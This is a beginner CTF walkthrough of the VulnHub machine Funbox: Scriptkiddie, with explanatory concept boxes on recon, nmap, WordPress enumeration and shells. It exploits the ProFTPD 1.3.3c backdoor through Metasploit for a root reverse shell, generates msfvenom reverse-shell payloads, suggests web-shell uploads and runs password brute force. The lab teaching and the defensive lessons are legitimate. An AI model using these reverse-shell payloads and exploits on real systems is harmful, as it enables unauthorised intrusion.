# Funbox: Scriptkiddie — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 11**. The author calls it *"a very easy box for
> beginners"* — and it is: a single well-known FTP vulnerability drops you
> straight into a **root** shell. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Scriptkiddie |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 20 July 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-scriptkiddie,725/ |
| **Download** | https://vulnhub.com/entry/funbox-scriptkiddie,725/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Important:** the box's web page expects the hostname **`funbox11`**. Add it
> to `/etc/hosts` before browsing, or the site will look broken.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to discover a host and scan its ports.
- Why an HTTP page can silently point you to a **hostname** you must add to
  `/etc/hosts`.
- How to enumerate a WordPress site (`gobuster`, `wpscan`) and recognise when it
  is a *dead end*.
- How to identify a **vulnerable service version** (ProFTPD 1.3.3c) with
  `searchsploit` and exploit it with Metasploit.
- That this backdoor returns a **root shell directly** — no privilege
  escalation step required.

**Prerequisites:** Kali Linux with your target VM imported and both on the same
host-only network (attacker `192.168.56.10`, target `192.168.56.101`).

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# This box exposes many ports — scan all of them
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,25,80,110,139,143,445 -oA scans/services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.3c          <-- old and backdoored
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** there are many services, but the standout is
> **`ProFTPD 1.3.3c`**. That exact version shipped with a malicious **backdoor**
> in its source code — an immediate red flag.

### 2.1 Fix the hostname problem

Browsing `http://192.168.56.101/` shows a page that links to `http://funbox11`.
The target expects a `Host: funbox11` header, so we add it locally.

```bash
sudo -e /etc/hosts
```

Add this line (keep any existing lines):

```text
192.168.56.101  funbox11
```

> **Why it works:** `/etc/hosts` lets your machine resolve `funbox11` to the
> target's IP without DNS. Virtual-hosted web servers often serve different
> content depending on the requested hostname.

### 2.2 Enumerate the website (a deliberate dead end)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://funbox11/ \
  -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html
```

```text
/wp-admin/           (Status: 301)
/wp-login.php        (Status: 200)
/wp-content/         (Status: 301)
/readme.html         (Status: 200)
```

The site is **WordPress**. A natural guess is `admin:admin`, and `wpscan` can
confirm the username and try a brute force:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://funbox11/ --enumerate u
wpscan --url http://funbox11/ -U admin -P /usr/share/wordlists/rockyou.txt
```

```text
[i] User(s) Identified:
[+] admin
[i] No Valid Passwords Found.
```

> **Why it works (and why it stalls):** `wpscan` is the standard WordPress
> scanner. Here it finds the user `admin` but **no exploitable plugin or weak
> password**, so WordPress is a rabbit-hole. Do not spend all your time here —
> move to the FTP service.

![nmap scan and the WordPress site](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability

`ProFTPD 1.3.3c` contains the **"Compromised Source" backdoor** — attackers
tampered with the project's source and added a hidden command that spawns a
shell when a client sends a specific username. It is publicly documented:

- Exploit-DB **16921** — *ProFTPd-1.3.3c Backdoor Command Execution (Metasploit)*
- Exploit-DB **15662** — *ProFTPd 1.3.3c Compromised Source Backdoor RCE*


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit "ProFTPD 1.3.3c"
```

```text
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit) | linux/remote/16921.rb
```

> **Why it works:** the backdoor runs the command as whatever user the FTP
> daemon runs as — and on this image that is **`root`**. There is no separate
> privilege-escalation phase.

### 3.2 Exploit it with Metasploit


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.56.10
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
```

```text
[*] Started reverse TCP double handler on 192.168.56.10:4444
[*] 192.168.56.101:21 - Sending Backdoor Command
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:50712)

id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@funbox11:/#
```

> **Manual alternative (no Metasploit):** read `searchsploit -m 15662` and put
> `HELP` / the magic username `ACIDBITCHEZ…` on the FTP connection as the PoC
> describes. Metasploit simply automates this.

![Metasploit ProFTPD exploit](images/03-foothold.png)

### 3.3 Get a stable TTY


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![root shell as funbox11](images/04-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

**There is no privilege-escalation step on this box.** The FTP backdoor already
returned a shell running as `root`:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the vulnerable `proftpd` process was started by `init` as
> `root`, so any command the backdoor executes inherits `root` privileges. This
> is why the box is rated *Easy* — the "privesc" and the foothold are the same
> event.

### The root flag

```bash
cd /root
ls -la
cat root.txt
```

```text
# ASCII art banner / a single flag; varies by build
```

![root flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | ProFTPD 1.3.3c compromised-source backdoor | FTP :21 | Remote Code Execution **as root** |
| 2 | Outdated, unsupported software | Multiple services | Broad, well-documented attack surface |
| 3 | WordPress with no hardening / version banner | HTTP :80 | User enumeration (dead end on this build) |

## 6. Defensive lessons (blue team)

- **Patch, patch, patch.** No supported ProFTPD is version 1.3.3c. Subscribe to
  vendor advisories and track service versions.
- **Never run network services as `root`.** Run `proftpd` (and every daemon)
  as a dedicated low-privilege user so a service compromise cannot become a
  host compromise.
- **Verify source integrity.** The backdoor entered via a tampered release;
  checksum/sign software you deploy.
- **Reduce attack surface.** Disable unused services (SMTP, POP3, IMAP, Samba)
  on hosts that do not need them.
- **Detection:** monitor FTP for the backdoor's magic username, and alert on
  unexpected outbound shells from a server that should merely store files.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: https://vulnhub.com/entry/funbox-scriptkiddie,725/
- Exploit-DB 16921 — ProFTPd 1.3.3c Backdoor (Metasploit):
  https://www.exploit-db.com/exploits/16921
- Exploit-DB 15662 — ProFTPd 1.3.3c Compromised Source Backdoor:
  https://www.exploit-db.com/exploits/15662
- wpscan: https://wpscan.com/wordpress-security-scanner
- Community writeups consulted:
  - [An ordinary day — FUNBOX: SCRIPTKIDDIE](https://blog.gibbons.digital/hacking/2021/08/01/scriptkiddie.html)
  - [Infosec Institute — Funbox Scriptkiddie walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/funbox-scriptkiddie-vulnhub-capture-the-flag-walkthrough/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap showing `ProFTPD 1.3.3c` + WordPress
- [ ] `images/03-foothold.png` — Metasploit ProFTPD exploit succeeding
- [ ] `images/04-shell.png` — root shell on `funbox11`
- [ ] `images/05-root-flag.png` — `cat /root/root.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
